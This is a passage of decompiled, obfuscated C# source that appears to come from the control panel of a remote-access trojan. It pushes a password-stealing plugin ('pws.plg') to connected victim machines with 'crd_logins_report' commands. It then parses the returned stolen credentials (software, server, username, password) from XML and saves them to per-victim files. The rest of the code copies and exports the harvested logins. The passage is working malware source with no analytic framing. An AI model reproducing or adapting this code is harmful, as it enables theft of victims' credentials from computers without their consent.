                            item.USER = current.USER;
                            item.TYPE = node.ChildNodes.Item(0).InnerText;
                            item.SOFTWARE = node.ChildNodes.Item(1).InnerText;
                            item.SERVER = node.ChildNodes.Item(2).InnerText;
                            item.USERNAME = node.ChildNodes.Item(3).InnerText;
                            item.PASSWORD = node.ChildNodes.Item(4).InnerText;
                            source.Push(item);
                            if (this.vmethod_50().get_Value() < this.vmethod_50().get_MaximumValue())
                            {
                                ZeroitAnidasoCircleProgress progress;
                                (progress = this.vmethod_50()).set_Value(progress.get_Value() + 1);
                                this.vmethod_70().Value = this.vmethod_50().get_Value();
                            }
                        }
                    }
                }
                view2 = null;
                this.vmethod_70().Value = 0;
                this.vmethod_50().set_Value(this.vmethod_50().get_MaximumValue());
                this.vmethod_50().Visible = false;
                this.vmethod_52().SetObjects(Enumerable.ToList<cCredentialsLogin>(source));
                this.vmethod_52().Enabled = true;
            }
        }
    }

    private void method_10(object sender, EventArgs e)
    {
        this.method_1();
    }

    private void method_11(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_10();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsUser current = (cCredentialsUser) enumerator.Current;
                builder.Append(current.sLogins.ToString());
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_12(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        IEnumerator enumerator = this.vmethod_10().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cCredentialsUser current = (cCredentialsUser) enumerator.Current;
            builder.Append(current.sLogins.ToString());
        }
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_13(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        IEnumerator enumerator = this.vmethod_10().get_SelectedObjects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cCredentialsUser current = (cCredentialsUser) enumerator.Current;
            builder.Append(current.sLogins.ToString());
        }
        if (builder.Length > 0)
        {
            string s = builder.ToString();
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "Text file |*.txt";
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                Class136.Class142 class2 = new Class136.Class142();
                class2.string_0 = dialog.FileName;
                class2.byte_0 = Encoding.Unicode.GetBytes(s);
                class2.bool_0 = false;
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_14(object sender, EventArgs e)
    {
        this.vmethod_68().Text = "Logins: " + Conversions.ToString(this.vmethod_52().get_Items().Count);
    }

    private void method_15(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                string[] textArray1 = new string[11];
                textArray1[0] = current.USER;
                textArray1[1] = "\t";
                textArray1[2] = current.TYPE;
                textArray1[3] = "\t";
                textArray1[4] = current.SOFTWARE;
                textArray1[5] = "\t";
                textArray1[6] = current.SERVER;
                textArray1[7] = "\t";
                textArray1[8] = current.USERNAME;
                textArray1[9] = "\t";
                textArray1[10] = current.PASSWORD;
                builder.AppendLine(string.Concat(textArray1));
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_16(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        IEnumerator enumerator = this.vmethod_52().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
            string[] textArray1 = new string[11];
            textArray1[0] = current.USER;
            textArray1[1] = "\t";
            textArray1[2] = current.TYPE;
            textArray1[3] = "\t";
            textArray1[4] = current.SOFTWARE;
            textArray1[5] = "\t";
            textArray1[6] = current.SERVER;
            textArray1[7] = "\t";
            textArray1[8] = current.USERNAME;
            textArray1[9] = "\t";
            textArray1[10] = current.PASSWORD;
            builder.AppendLine(string.Concat(textArray1));
        }
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_17(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                builder.AppendLine(current.USER);
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_18(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                builder.AppendLine(current.TYPE);
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_19(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                builder.AppendLine(current.SOFTWARE);
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    public void method_2()
    {
        if (this.vmethod_52().InvokeRequired)
        {
            this.vmethod_52().Invoke(new Delegate77(this.method_2), new object[0]);
        }
        else
        {
            long num;
            this.vmethod_52().Enabled = false;
            this.vmethod_52().ClearObjects();
            this.vmethod_52().Update();
            ConcurrentStack<cCredentialsLogin> source = new ConcurrentStack<cCredentialsLogin>();
            this.vmethod_70().Value = 0;
            this.vmethod_50().set_Value(0);
            IEnumerator<KeyValuePair<string, cCredentialsUser>> enumerator = Class130.concurrentDictionary_8.GetEnumerator();
            while (enumerator.MoveNext())
            {
                KeyValuePair<string, cCredentialsUser> current = enumerator.Current;
                num = (long) Math.Round((double) (num + Conversions.ToDouble(current.Value.LOGINS)));
            }
            this.vmethod_70().Maximum = (int) num;
            this.vmethod_50().set_MaximumValue((int) num);
            this.vmethod_50().Visible = true;
            IEnumerator<KeyValuePair<string, cCredentialsUser>> enumerator2 = Class130.concurrentDictionary_8.GetEnumerator();
            while (enumerator2.MoveNext())
            {
                KeyValuePair<string, cCredentialsUser> current = enumerator2.Current;
                IEnumerator enumerator3 = current.Value.xmlList.GetEnumerator();
                while (true)
                {
                    if (!enumerator3.MoveNext())
                    {
                        Application.DoEvents();
                        break;
                    }
                    XmlNode node = (XmlNode) enumerator3.Current;
                    cCredentialsLogin item = new cCredentialsLogin();
                    item.Key = current.Value.Key;
                    item.USER = current.Value.USER;
                    item.TYPE = node.ChildNodes.Item(0).InnerText;
                    item.SOFTWARE = node.ChildNodes.Item(1).InnerText;
                    item.SERVER = node.ChildNodes.Item(2).InnerText;
                    item.USERNAME = node.ChildNodes.Item(3).InnerText;
                    item.PASSWORD = node.ChildNodes.Item(4).InnerText;
                    source.Push(item);
                    if (this.vmethod_50().get_Value() < this.vmethod_50().get_MaximumValue())
                    {
                        ZeroitAnidasoCircleProgress progress;
                        (progress = this.vmethod_50()).set_Value(progress.get_Value() + 1);
                        this.vmethod_70().Value = this.vmethod_50().get_Value();
                    }
                }
            }
            this.vmethod_70().Value = 0;
            this.vmethod_50().set_Value(this.vmethod_50().get_MaximumValue());
            this.vmethod_50().Visible = false;
            this.vmethod_52().SetObjects(Enumerable.ToList<cCredentialsLogin>(source));
            this.vmethod_52().Enabled = true;
        }
    }

    private void method_20(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                builder.AppendLine(current.SERVER);
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_21(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                builder.AppendLine(current.USERNAME);
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_22(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_52();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cCredentialsLogin current = (cCredentialsLogin) enumerator.Current;
                builder.AppendLine(current.PASSWORD);
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_23(object sender, EventArgs e)
    {
    }

    private void method_24(object sender, MouseEventArgs e)
    {
        this.vmethod_74().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_52().get_SelectedObjects().Count > 0, true, false));
    }

    private void method_25(object sender, EventArgs e)
    {
    }

    private void method_26(object sender, EventArgs e)
    {
        this.method_1();
    }

    private void method_27(object sender, EventArgs e)
    {
        Class130.concurrentDictionary_8.Clear();
        this.vmethod_52().ClearObjects();
        this.vmethod_10().ClearObjects();
    }

    private void method_28(object sender, EventArgs e)
    {
    }

    private void method_29(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        IEnumerator enumerator = this.vmethod_10().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cCredentialsUser current = (cCredentialsUser) enumerator.Current;
            builder.Append(current.sLogins.ToString());
        }
        if (builder.Length > 0)
        {
            string s = builder.ToString();
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "Text file |*.txt";
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                Class136.Class142 class2 = new Class136.Class142();
                class2.string_0 = dialog.FileName;
                class2.byte_0 = Encoding.Unicode.GetBytes(s);
                class2.bool_0 = false;
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    public void method_3(string string_0, string string_1, string string_2)
    {
        int num5;
        ProjectData.ClearProjectError();
        if (this.vmethod_10().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1, string_2 };
            this.vmethod_10().Invoke(new Delegate75(this.method_3), args);
        }
        else
        {
            if (Class130.concurrentDictionary_8.ContainsKey(string_0))
            {
                this.vmethod_10().RemoveObject(Class130.concurrentDictionary_8[string_0]);
                Class130.concurrentDictionary_8.TryRemove(string_0, out (cCredentialsUser) out null);
            }
            cCredentialsUser user2 = new cCredentialsUser();
            user2.USER = string_1;
            user2.LOGINS = "N/A";
            user2.Key = string_0;
            int num3 = Enumerable.Count<string>(user2.idxValues) - 1;
            int index = 1;
            while (true)
            {
                if (index > num3)
                {
                    string_2 = Strings.Replace(string_2, "&", "&amp;", 1, -1, CompareMethod.Text);
                    if (Operators.CompareString(string_2.Substring(string_2.Length - 0x2e), "</app_password>\r\n</app_password_list>\r\n</root>", true) != 0)
                    {
                        string_2 = string_2 + "</app_password>\r\n</app_password_list>\r\n</root>";
                    }
                    XmlDocument document = new XmlDocument();
                    document.LoadXml(string_2);
                    XmlNodeList list = document.SelectNodes("/root/app_password_list/app_password");
                    user2.LOGINS = Conversions.ToString(list.Count);
                    user2.xmlList = list;
                    IEnumerator enumerator = list.GetEnumerator();
                    while (true)
                    {
                        if (!enumerator.MoveNext())
                        {
                            if (enumerator is IDisposable)
                            {
                                (enumerator as IDisposable).Dispose();
                            }
                            if (Class135.smethod_0().PluginsSavePws & (user2.sLogins.Length > 0))
                            {
                                if (!File.Exists(Application.StartupPath + @"\Passwords"))
                                {
                                    Class136.smethod_17(ref Path.GetDirectoryName(Application.StartupPath + @"\Passwords"));
                                }
                                Class136.Class142 class2 = new Class136.Class142();
                                class2.string_0 = Application.StartupPath + @"\Passwords\" + Strings.Replace(string_1, @"\", "@", 1, -1, CompareMethod.Text) + ".txt";
                                class2.byte_0 = Encoding.UTF8.GetBytes(user2.sLogins.ToString());
                                class2.bool_0 = false;
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            Class130.concurrentDictionary_8.TryAdd(string_0, user2);
                            Class130.concurrentDictionary_8[string_0].Key = string_0;
                            this.vmethod_10().set_OwnerDraw(true);
                            this.vmethod_10().AddObject(user2);
                            break;
                        }
                        XmlNode current = (XmlNode) enumerator.Current;
                        string[] textArray1 = new string[9];
                        textArray1[0] = current.ChildNodes.Item(0).InnerText;
                        textArray1[1] = "\t";
                        textArray1[2] = current.ChildNodes.Item(1).InnerText;
                        textArray1[3] = "\t";
                        textArray1[4] = current.ChildNodes.Item(2).InnerText;
                        textArray1[5] = "\t";
                        textArray1[6] = current.ChildNodes.Item(3).InnerText;
                        textArray1[7] = "\t";
                        textArray1[8] = current.ChildNodes.Item(4).InnerText;
                        user2.sLogins.AppendLine(string.Concat(textArray1));
                    }
                    break;
                }
                user2.idxValues[index] = "N/A";
                index++;
            }
        }
        if (num5 != 0)
        {
            ProjectData.ClearProjectError();
        }
    }

    private void method_30(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        if (this.vmethod_52().get_Items().Count != 0)
        {
            FastObjectListView view = this.vmethod_52();
            int num = view.get_Items().Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    view = null;
                    if (builder.Length > 0)
                    {
                        string str = builder.ToString();
                        SaveFileDialog dialog = new SaveFileDialog();
                        dialog.Filter = "Text file |*.txt";
                        if (dialog.ShowDialog() == DialogResult.OK)
                        {
                            Class136.Class142 class2 = new Class136.Class142();
                            class2.string_0 = dialog.FileName;
                            class2.byte_0 = Encoding.Unicode.GetBytes(str.Remove(str.LastIndexOf("\r\n")));
                            class2.bool_0 = false;
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                    break;
                }
                if (view.get_Items()[num2].Selected)
                {
                    builder.Append(view.get_Items()[num2].Text);
                    int num3 = view.get_Columns().Count - 1;
                    int num4 = 1;
                    while (true)
                    {
                        if (num4 > num3)
                        {
                            builder.Append("\r\n");
                            break;
                        }
                        builder.Append("\t" + view.get_Items()[num2].SubItems[num4].Text);
                        num4++;
                    }
                }
                num2++;
            }
        }
    }

    private void method_31(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        if (this.vmethod_52().get_Items().Count != 0)
        {
            FastObjectListView view = this.vmethod_52();
            int num = view.get_Items().Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    view = null;
                    if (builder.Length > 0)
                    {
                        string str = builder.ToString();
                        SaveFileDialog dialog = new SaveFileDialog();
                        dialog.Filter = "Text file |*.txt";
                        if (dialog.ShowDialog() == DialogResult.OK)
                        {
                            Class136.Class142 class2 = new Class136.Class142();
                            class2.string_0 = dialog.FileName;
                            class2.byte_0 = Encoding.Unicode.GetBytes(str.Remove(str.LastIndexOf("\r\n")));
                            class2.bool_0 = false;
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                    break;
                }
                builder.Append(view.get_Items()[num2].Text);
                int num3 = view.get_Columns().Count - 1;
                int num4 = 1;
                while (true)
                {
                    if (num4 > num3)
                    {
                        builder.Append("\r\n");
                        num2++;
                        break;
                    }
                    builder.Append("\t" + view.get_Items()[num2].SubItems[num4].Text);
                    num4++;
                }
            }
        }
    }

    private void method_4(object sender, EventArgs e)
    {
        if (!File.Exists(Application.StartupPath + @"\data\plugins\pws.plg"))
        {
            Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + @"\data\plugins\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string str3;
            string sKey;
            Class136.Class138 class2;
            string str2 = Class136.smethod_29(ref Application.StartupPath + @"\data\plugins\pws.plg");
            if (Class135.smethod_0().PluginsUpload)
            {
                IEnumerator enumerator = Class130.fMain_0.vmethod_18().get_Objects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    str3 = "crd_logins_report_req|" + str2;
                    sKey = ((CClient) enumerator.Current).sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str3;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            else if (((((Class135.smethod_0().PluginsURLPws.Length < 8) | !Class135.smethod_0().PluginsURLPws.Contains("://")) | !Class135.smethod_0().PluginsURLPws.Contains("http")) | !Class135.smethod_0().PluginsURLPws.Contains(".")) | (Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0))
            {
                Interaction.MsgBox("URL to plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
                Class130.fSettings_0.Visible = true;
                Class130.fSettings_0.Activate();
                Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
            }
            else
            {
                IEnumerator enumerator = Class130.fMain_0.vmethod_18().get_Objects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    str3 = "crd_logins_report|" + str2 + "|" + Class135.smethod_0().PluginsURLPws;
                    sKey = ((CClient) enumerator.Current).sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str3;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        if (!File.Exists(Application.StartupPath + @"\data\plugins\pws.plg"))
        {
            Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + @"\data\plugins\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string str3;
            string sKey;
            Class136.Class138 class2;
            string str2 = Class136.smethod_29(ref Application.StartupPath + @"\data\plugins\pws.plg");
            if (Class135.smethod_0().PluginsUpload)
            {
                IEnumerator enumerator = Class130.fMain_0.vmethod_18().get_SelectedObjects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    str3 = "crd_logins_report_req|" + str2;
                    sKey = ((CClient) enumerator.Current).sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str3;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            else if (((((Class135.smethod_0().PluginsURLPws.Length < 8) | !Class135.smethod_0().PluginsURLPws.Contains("://")) | !Class135.smethod_0().PluginsURLPws.Contains("http")) | !Class135.smethod_0().PluginsURLPws.Contains(".")) | (Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0))
            {
                Interaction.MsgBox("URL to plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
                Class130.fSettings_0.Visible = true;
                Class130.fSettings_0.Activate();
                Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
            }
            else
            {
                IEnumerator enumerator = Class130.fMain_0.vmethod_18().get_SelectedObjects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    str3 = "crd_logins_report|" + str2 + "|" + Class135.smethod_0().PluginsURLPws;
                    sKey = ((CClient) enumerator.Current).sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str3;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
        }
    }

    private void method_6(object sender, MouseEventArgs e)
    {
        this.vmethod_8().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_Items().Count > 0, true, false));
        this.vmethod_12().Enabled = Conversions.ToBoolean(Interaction.IIf(Class130.fMain_0.vmethod_18().get_Items().Count > 0, true, false));
        this.vmethod_14().Enabled = Conversions.ToBoolean(Interaction.IIf(Class130.fMain_0.vmethod_18().get_Items().Count > 0, true, false));
        this.vmethod_16().Enabled = Conversions.ToBoolean(Interaction.IIf(Class130.fMain_0.vmethod_18().get_SelectedObjects().Count > 0, true, false));
        this.vmethod_34().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_Items().Count > 0, true, false));
        this.vmethod_38().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_SelectedObjects().Count > 0, true, false));
        this.vmethod_24().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_Items().Count > 0, true, false));
        this.vmethod_28().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_SelectedObjects().Count > 0, true, false));
        this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_Items().Count > 0, true, false));
        this.vmethod_46().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().get_SelectedObjects().Count > 0, true, false));
    }

    private void method_7(object sender, EventArgs e)
    {
        long num;
        this.vmethod_102().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().get_SelectedObjects().Count);
        this.vmethod_106().Text = "Reports: " + Conversions.ToString(this.vmethod_10().get_Items().Count);
        IEnumerator enumerator = this.vmethod_10().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cCredentialsUser current = (cCredentialsUser) enumerator.Current;
            num = (long) Math.Round((double) (num + Conversion.Val(current.LOGINS)));
        }
        this.vmethod_108().Text = "Total logins: " + Conversions.ToString(num);
    }

    private void method_8(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_10().get_Items().GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_9(object sender, EventArgs e)
    {
        this.method_2();
    }

    internal virtual Timer vmethod_0()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(Timer timer_2)
    {
        EventHandler handler = new EventHandler(this.method_7);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_2;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual FastObjectListView vmethod_10()
    {
        return this.fastObjectListView_0;
    }

    internal virtual ToolStripStatusLabel vmethod_100()
    {
        return this.toolStripStatusLabel_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_101(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_1 = toolStripStatusLabel_5;
    }

    internal virtual ToolStripStatusLabel vmethod_102()
    {
        return this.toolStripStatusLabel_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_103(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_2 = toolStripStatusLabel_5;
    }

    internal virtual StatusStrip vmethod_104()
    {
        return this.statusStrip_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_105(StatusStrip statusStrip_2)
    {
        this.statusStrip_1 = statusStrip_2;
    }

    internal virtual ToolStripStatusLabel vmethod_106()
    {
        return this.toolStripStatusLabel_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_107(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_3 = toolStripStatusLabel_5;
    }

    internal virtual ToolStripStatusLabel vmethod_108()
    {
        return this.toolStripStatusLabel_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_109(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_4 = toolStripStatusLabel_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(FastObjectListView fastObjectListView_2)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_6);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_8);
        EventHandler handler3 = new EventHandler(this.method_25);
        EventHandler handler4 = new EventHandler(this.method_26);
        FastObjectListView view = this.fastObjectListView_0;
        if (view != null)
        {
            view.MouseUp -= handler;
            view.KeyDown -= handler2;
            view.SelectedIndexChanged -= handler3;
            view.DoubleClick -= handler4;
        }
        this.fastObjectListView_0 = fastObjectListView_2;
        view = this.fastObjectListView_0;
        if (view != null)
        {
            view.MouseUp += handler;
            view.KeyDown += handler2;
            view.SelectedIndexChanged += handler3;
            view.DoubleClick += handler4;
        }
    }

    internal virtual ToolStripMenuItem vmethod_110()
    {
        return this.toolStripMenuItem_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_111(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_27);
        ToolStripMenuItem item = this.toolStripMenuItem_23;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_23 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_23;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_112()
    {
        return this.toolStripSeparator_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_113(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_9 = toolStripSeparator_12;
    }

    internal virtual ToolStripSeparator vmethod_114()
    {
        return this.toolStripSeparator_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_115(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_10 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_116()
    {
        return this.toolStripMenuItem_24;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_117(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_24 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_118()
    {
        return this.toolStripMenuItem_25;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_119(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_30);
        ToolStripMenuItem item = this.toolStripMenuItem_25;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_25 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_25;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_12()
    {
        return this.toolStripMenuItem_1;
    }

    internal virtual ToolStripSeparator vmethod_120()
    {
        return this.toolStripSeparator_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_121(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_11 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_122()
    {
        return this.toolStripMenuItem_26;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_123(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_31);
        ToolStripMenuItem item = this.toolStripMenuItem_26;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_26 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_26;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_1 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_14()
    {
        return this.toolStripMenuItem_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_4);
        ToolStripMenuItem item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_2 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_16()
    {
        return this.toolStripMenuItem_3;
    }
